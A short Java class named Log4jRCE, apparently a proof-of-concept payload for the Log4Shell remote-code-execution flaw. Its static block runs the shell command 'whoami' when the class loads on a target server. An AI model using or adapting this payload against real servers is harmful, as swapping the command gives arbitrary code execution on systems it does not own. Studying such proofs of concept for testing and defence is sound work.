public class Log4jRCE {
    static {
        try {
            String cmd = "whoami";
            Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
